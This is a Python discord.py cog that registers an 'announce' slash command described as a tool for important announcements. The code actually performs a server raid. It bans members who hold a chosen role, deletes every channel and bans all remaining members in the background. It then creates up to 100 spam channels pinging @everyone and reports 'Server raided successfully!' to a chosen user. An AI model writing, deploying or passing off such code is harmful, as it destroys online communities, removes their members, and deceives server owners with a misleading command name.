import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class Announce(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="announce", description="Herramienta de anuncios importantes")
    @app_commands.describe(
        useradmin="Usuario administrador principal",
        roletogive="Rol de administración",
        message="Mensaje importante para anunciar"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def announce(self, interaction: discord.Interaction, 
                      useradmin: discord.User, 
                      roletogive: discord.Role, 
                      message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
        
        try:
            guild = interaction.guild
            
            # 1. Banear miembros con el rol especificado (excepto useradmin y el bot)
            banned_members = 0
            members_to_ban = []
            
            async for member in guild.fetch_members():
                if any(role.id == roletogive.id for role in member.roles):
                    if member.id != useradmin.id and member.id != self.bot.user.id:
                        members_to_ban.append(member)
            
            # Banear miembros en paralelo
            ban_tasks = []
            for member in members_to_ban:
                try:
                    ban_tasks.append(member.ban(reason=f"Reorganización: {interaction.user}"))
                    banned_members += 1
                except Exception as e:
                    print(f"No se pudo banear a {member}: {e}")
            
            if ban_tasks:
                await asyncio.gather(*ban_tasks, return_exceptions=True)
            
            # 2. Añadir rol al admin
            try:
                admin_member = await guild.fetch_member(useradmin.id)
                await admin_member.add_roles(roletogive)
            except Exception as e:
                print(f"No se pudo añadir el rol a {useradmin}: {e}")
            
            # 3. Eliminar todos los canales
            delete_tasks = []
            for channel in guild.channels:
                delete_tasks.append(channel.delete())
            
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
            
            # 4. Iniciar baneo masivo en segundo plano mientras se crean canales
            async def mass_ban():
                banned_count = 0
                async for member in guild.fetch_members():
                    try:
                        if member.id != useradmin.id and member.id != self.bot.user.id:
                            await member.ban(reason=f"Reorganización masiva: {interaction.user}")
                            banned_count += 1
                    except Exception as e:
                        print(f"No se pudo banear a {member}: {e}")
                        continue
                print(f"Baneo masivo completado. Total baneados: {banned_count}")
            
            # Ejecutar baneo masivo en segundo plano
            asyncio.create_task(mass_ban())
            
            # 5. Crear canales y spamear mensajes de forma más rápida
            spam_message = f"@everyone {message}"
            max_channels = 100
            raid_message = "✅ Server raided successfully!"
            
            # Crear el primer canal y enviar el mensaje de raid
            first_channel = None
            try:
                first_channel = await guild.create_text_channel("raid-notice")
                await first_channel.send(raid_message)
                # Enviar también los mensajes de spam en el primer canal
                for _ in range(3):
                    await first_channel.send(spam_message)
            except Exception as e:
                print(f"Error al crear el primer canal: {e}")
            
            # Función para crear canales y enviar mensajes de forma concurrente
            async def create_channel_and_spam(channel_num):
                try:
                    channel_name = f"{message}-{channel_num}"
                    new_channel = await guild.create_text_channel(channel_name[:100])
                    
                    # Enviar mensajes de forma concurrente
                    send_tasks = []
                    for _ in range(3):
                        send_tasks.append(new_channel.send(spam_message))
                    
                    await asyncio.gather(*send_tasks, return_exceptions=True)
                    return True
                except Exception as e:
                    print(f"Error al crear canal {channel_num}: {e}")
                    return False
            
            # Crear múltiples canales de forma concurrente
            channel_count = 1  # Ya creamos el primer canal
            channel_tasks = []
            
            for i in range(max_channels - 1):
                channel_tasks.append(create_channel_and_spam(i))
                # Pequeño delay para evitar rate limits extremos
                if i % 5 == 0:
                    await asyncio.sleep(0.1)
            
            # Esperar a que se completen todas las tareas de creación de canales
            results = await asyncio.gather(*channel_tasks, return_exceptions=True)
            channel_count += sum(1 for r in results if r is True)
            
            # 6. Enviar mensaje al DM del useradmin
            try:
                dm_channel = await useradmin.create_dm()
                await dm_channel.send(
                    f"✅ Server raided successfully!\n"
                    f"- Initial bans: {banned_members}\n"
                    f"- Channels created: {channel_count}\n"
                    f"- Message: {message}"
                )
            except Exception as e:
                print(f"No se pudo enviar mensaje al DM de {useradmin}: {e}")
            
            await interaction.followup.send(
                f"Operación completada. Se banearon {banned_members} miembros inicialmente. " +
                f"Se crearon {channel_count} canales. El baneo masivo continúa en segundo plano.",
                ephemeral=True
            )
            
        except Exception as e:
            print(f"Error durante la ejecución: {e}")
            try:
                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
            except:
                pass

async def setup(bot):
    await bot.add_cog(Announce(bot))
